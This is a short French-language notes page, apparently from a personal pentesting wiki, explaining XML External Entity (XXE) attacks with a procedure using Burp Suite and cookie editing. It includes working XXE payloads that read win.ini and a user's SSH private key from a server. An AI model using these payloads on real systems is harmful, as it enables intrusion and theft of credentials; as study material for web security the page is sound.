<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](index.md)</sub>
#XML External Entities (XEE ou XXE)

**Présentation :** Tenter de trouver une faille dans les inputs puis d'intercepter et de modifier les requêtes pour pénétrer le serveur


**Procédure :**
- tenter [SSTI](ssti.md)
- on repère une requête qui reçoit un argument
- Avec [Burp Suite](burp_suite.md), tenter d'intercepter et de modifier les requêtes pour pénétrer le serveur
- Identifier la présence de [cookies](cookies.md)
- Modifier en live les [cookies](cookies.md) si besoin avec [Cookie Editor](cookie_editor.md)
 

**Exemple :**
- on regarde le retour du service, si il affiche une valeur on peut très bien remplacer la valeur avec burpsuite :
  - *<<span>!DOCTYPE root [<<span>!ENTITY test SYSTEM 'file<span>:<span>///c:/windows/win.ini'>]>*
              puis on modifie par ex : <<item>Magasin</item> par item>&test;</item>
              => si XEE possible on devrait avoir un retour avec affichage d'infos
              => autre exemple => <<span>!DOCTYPE root [<<span>!ENTITY test SYSTEM '<span>file:///c:/users/daniel/.ssh/id_rsa'>]>
